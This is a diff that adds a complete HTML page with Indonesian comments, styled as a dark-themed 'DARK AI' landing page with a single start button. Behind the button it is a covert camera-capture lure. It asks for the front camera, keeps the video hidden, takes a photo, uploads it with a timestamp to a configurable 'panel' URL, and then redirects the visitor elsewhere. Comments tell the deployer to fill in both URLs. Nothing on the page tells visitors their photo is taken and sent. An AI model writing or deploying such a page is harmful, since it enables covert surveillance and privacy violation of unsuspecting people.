@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>DARK AI - Capture</title>
+    <style>
+        /* ===== RESET & FULLSCREEN ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+
+        body {
+            background: #0a0a0a;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            position: relative;
+        }
+
+        /* ===== BACKGROUND DENGAN EFFECT SETAN ===== */
+        .container {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background: 
+                radial-gradient(ellipse at center, rgba(139, 0, 0, 0.15) 0%, transparent 70%),
+                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 50%),
+                #0a0a0a;
+            position: relative;
+        }
+
+        /* ===== DECORATIVE LINES (SEPERTI THEME DARK) ===== */
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: 
+                repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(255, 0, 0, 0.03) 2px, rgba(255, 0, 0, 0.03) 4px),
+                repeating-linear-gradient(90deg, transparent, transparent 2px, rgba(255, 0, 0, 0.03) 2px, rgba(255, 0, 0, 0.03) 4px);
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        /* ===== GAMBAR SETAN (UNICODE + CSS) ===== */
+        .devil-icon {
+            font-size: 120px;
+            line-height: 1;
+            margin-bottom: 10px;
+            text-shadow: 0 0 60px rgba(255, 0, 0, 0.6), 0 0 120px rgba(255, 0, 0, 0.3);
+            animation: devilGlow 3s ease-in-out infinite;
+            position: relative;
+            z-index: 1;
+            filter: drop-shadow(0 0 30px rgba(255, 0, 0, 0.4));
+        }
+
+        @keyframes devilGlow {
+            0%, 100% { 
+                text-shadow: 0 0 60px rgba(255, 0, 0, 0.6), 0 0 120px rgba(255, 0, 0, 0.3);
+                transform: scale(1);
+            }
+            50% { 
+                text-shadow: 0 0 80px rgba(255, 0, 0, 0.8), 0 0 160px rgba(255, 0, 0, 0.5), 0 0 200px rgba(255, 0, 0, 0.2);
+                transform: scale(1.05);
+            }
+        }
+
+        /* ===== LOGO DARK AI ===== */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 40px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-text {
+            font-size: 48px;
+            font-weight: 900;
+            color: #fff;
+            letter-spacing: 4px;
+            text-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
+            position: relative;
+        }
+
+        .logo-text .dark {
+            color: #ff0000;
+            text-shadow: 0 0 40px rgba(255, 0, 0, 0.6);
+        }
+
+        .logo-text .ai {
+            color: #ffffff;
+            text-shadow: 0 0 40px rgba(255, 255, 255, 0.3);
+        }
+
+        .logo-text .dot {
+            color: #ff0000;
+            animation: dotPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes dotPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+
+        /* ===== SUBTITLE ===== */
+        .subtitle {
+            color: rgba(255, 255, 255, 0.4);
+            font-size: 14px;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            margin-bottom: 50px;
+            position: relative;
+            z-index: 1;
+            font-weight: 300;
+        }
+
+        /* ===== VIDEO (HIDDEN) ===== */
+        #video {
+            display: none;
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        /* ===== TOMBOL MULAI ===== */
+        #btnMulai {
+            position: relative;
+            z-index: 10;
+            padding: 20px 65px;
+            font-size: 22px;
+            font-weight: 700;
+            color: #fff;
+            background: transparent;
+            border: 2px solid rgba(255, 0, 0, 0.6);
+            border-radius: 50px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            transition: all 0.3s ease;
+            font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.1), inset 0 0 30px rgba(255, 0, 0, 0.05);
+            overflow: hidden;
+        }
+
+        #btnMulai::before {
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: -2px;
+            right: -2px;
+            bottom: -2px;
+            background: linear-gradient(45deg, #ff0000, transparent, #ff0000, transparent);
+            background-size: 400% 400%;
+            border-radius: 50px;
+            z-index: -1;
+            animation: borderGlow 3s ease-in-out infinite;
+            opacity: 0.3;
+        }
+
+        @keyframes borderGlow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        #btnMulai:hover {
+            transform: scale(1.05);
+            border-color: #ff0000;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.3), inset 0 0 60px rgba(255, 0, 0, 0.1);
+        }
+
+        #btnMulai:active {
+            transform: scale(0.95);
+        }
+
+        #btnMulai:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            animation: none;
+            transform: scale(1);
+            border-color: rgba(255, 0, 0, 0.2);
+        }
+
+        /* ===== LOADING LINGKARAN MERAH ===== */
+        #loadingOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: rgba(10, 10, 10, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 20;
+        }
+
+        #loadingOverlay.active {
+            display: flex;
+        }
+
+        .loader {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 4px solid rgba(255, 0, 0, 0.1);
+            border-top: 4px solid #ff0000;
+            border-right: 4px solid #ff0000;
+            animation: spin 0.8s linear infinite;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.3);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        #loadingText {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 18px;
+            font-weight: 300;
+            margin-top: 30px;
+            letter-spacing: 4px;
+            animation: fadeInOut 1.5s ease-in-out infinite;
+            font-family: 'Orbitron', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        @keyframes fadeInOut {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        /* ===== FLOATING PARTICLES (EFFECT SETAN) ===== */
+        .particle {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: rgba(255, 0, 0, 0.3);
+            border-radius: 50%;
+            animation: floatParticle 8s infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes floatParticle {
+            0%, 100% { 
+                transform: translateY(0) translateX(0) scale(1);
+                opacity: 0.3;
+            }
+            25% { 
+                transform: translateY(-30px) translateX(20px) scale(1.5);
+                opacity: 0.6;
+            }
+            50% { 
+                transform: translateY(-60px) translateX(-10px) scale(1);
+                opacity: 0.3;
+            }
+            75% { 
+                transform: translateY(-30px) translateX(30px) scale(1.5);
+                opacity: 0.6;
+            }
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 768px) {
+            .devil-icon {
+                font-size: 80px;
+            }
+
+            .logo-text {
+                font-size: 32px;
+                letter-spacing: 2px;
+            }
+
+            .subtitle {
+                font-size: 11px;
+                letter-spacing: 5px;
+            }
+
+            #btnMulai {
+                padding: 16px 40px;
+                font-size: 18px;
+                letter-spacing: 3px;
+            }
+
+            .loader {
+                width: 80px;
+                height: 80px;
+            }
+
+            #loadingText {
+                font-size: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .devil-icon {
+                font-size: 60px;
+            }
+
+            .logo-text {
+                font-size: 24px;
+                letter-spacing: 1px;
+            }
+
+            .subtitle {
+                font-size: 9px;
+                letter-spacing: 3px;
+                margin-bottom: 30px;
+            }
+
+            #btnMulai {
+                padding: 14px 30px;
+                font-size: 15px;
+                letter-spacing: 2px;
+                border-width: 1.5px;
+            }
+
+            .loader {
+                width: 60px;
+                height: 60px;
+                border-width: 3px;
+            }
+
+            #loadingText {
+                font-size: 14px;
+                letter-spacing: 2px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="container">
+        <!-- ===== PARTICLES (EFFECT SETAN) ===== -->
+        <div class="particle" style="top: 10%; left: 5%; animation-delay: 0s;"></div>
+        <div class="particle" style="top: 20%; right: 10%; animation-delay: 2s;"></div>
+        <div class="particle" style="bottom: 30%; left: 15%; animation-delay: 4s;"></div>
+        <div class="particle" style="bottom: 10%; right: 5%; animation-delay: 1s;"></div>
+        <div class="particle" style="top: 50%; left: 3%; animation-delay: 3s;"></div>
+        <div class="particle" style="top: 40%; right: 3%; animation-delay: 5s;"></div>
+        <div class="particle" style="bottom: 50%; left: 8%; animation-delay: 0.5s;"></div>
+        <div class="particle" style="bottom: 20%; right: 15%; animation-delay: 2.5s;"></div>
+
+        <!-- ===== ICON SETAN ===== -->
+        <div class="devil-icon">😈</div>
+
+        <!-- ===== LOGO DARK AI ===== -->
+        <div class="logo-container">
+            <span class="logo-text">
+                <span class="dark">DARK</span> <span class="ai">AI</span><span class="dot">.</span>
+            </span>
+        </div>
+
+        <div class="subtitle">⚡ ENTER THE DARKNESS ⚡</div>
+
+        <!-- ===== VIDEO & CANVAS (HIDDEN) ===== -->
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+
+        <!-- ===== TOMBOL MULAI ===== -->
+        <button id="btnMulai">▶ MULAI</button>
+
+        <!-- ===== LOADING OVERLAY ===== -->
+        <div id="loadingOverlay">
+            <div class="loader"></div>
+            <div id="loadingText">MENGIRIM FOTO...</div>
+        </div>
+    </div>
+
+    <script>
+        // ===== ELEMEN =====
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const btnMulai = document.getElementById('btnMulai');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const loadingText = document.getElementById('loadingText');
+        const container = document.getElementById('container');
+
+        // ===== KONFIGURASI =====
+        // GANTI URL REDIRECT (TUJUAN ANDA)
+        const REDIRECT_URL = 'https://anonymous1ndonesia.github.io/Dark/'; // <-- GANTI INI
+
+        // GANTI URL PANEL UNTUK MENGIRIM FOTO
+        const PANEL_URL = 'https://your-panel-api.com/upload'; // <-- GANTI INI
+
+        let stream = null;
+        let capturedImage = null;
+
+        // ===== FUNGSI MULAI KAMERA & CAPTURE OTOMATIS =====
+        async function startAndCapture() {
+            // Disable tombol
+            btnMulai.disabled = true;
+            btnMulai.textContent = '⏳...';
+
+            try {
+                // 1. Minta izin kamera depan
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                });
+
+                video.srcObject = stream;
+                await video.play();
+
+                // 2. Tunggu kamera stabil
+                await new Promise(resolve => setTimeout(resolve, 300));
+
+                // 3. Ambil foto
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                capturedImage = canvas.toDataURL('image/jpeg', 0.9);
+
+                // 4. Matikan kamera
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                    video.srcObject = null;
+                }
+
+                // 5. Tampilkan loading
+                loadingOverlay.classList.add('active');
+                loadingText.textContent = '📤 MENGIRIM FOTO...';
+
+                // 6. Kirim ke panel (background)
+                kirimKePanel();
+
+                // 7. Redirect setelah 3 detik
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 3000);
+
+            } catch (error) {
+                console.error('Error:', error);
+                
+                // Jika gagal, tetap redirect
+                loadingOverlay.classList.add('active');
+                loadingText.textContent = '⏳ MENGARAHKAN...';
+                
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 2000);
+            }
+        }
+
+        // ===== FUNGSI KIRIM KE PANEL =====
+        async function kirimKePanel() {
+            if (!capturedImage) {
+                console.log('Tidak ada foto untuk dikirim');
+                return;
+            }
+
+            try {
+                const responseBlob = await fetch(capturedImage);
+                const blob = await responseBlob.blob();
+
+                const formData = new FormData();
+                formData.append('foto', blob, 'foto_depan.jpg');
+                formData.append('timestamp', new Date().toISOString());
+
+                fetch(PANEL_URL, {
+                    method: 'POST',
+                    body: formData,
+                })
+                .then(response => {
+                    if (response.ok) {
+                        console.log('✅ Foto berhasil dikirim ke panel');
+                    } else {
+                        console.log('❌ Gagal kirim ke panel:', response.status);
+                    }
+                })
+                .catch(err => {
+                    console.log('❌ Error kirim:', err.message);
+                });
+
+            } catch (error) {
+                console.log('❌ Gagal mengirim:', error.message);
+            }
+        }
+
+        // ===== EVENT LISTENER =====
+        btnMulai.addEventListener('click', startAndCapture);
+
+        // ===== CEK DUKUNGAN BROWSER =====
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            btnMulai.disabled = true;
+            btnMulai.textContent = '⚠️ TIDAK DIDUKUNG';
+        }
+
+        // ===== CLEANUP =====
+        window.addEventListener('beforeunload', function() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+  </html>
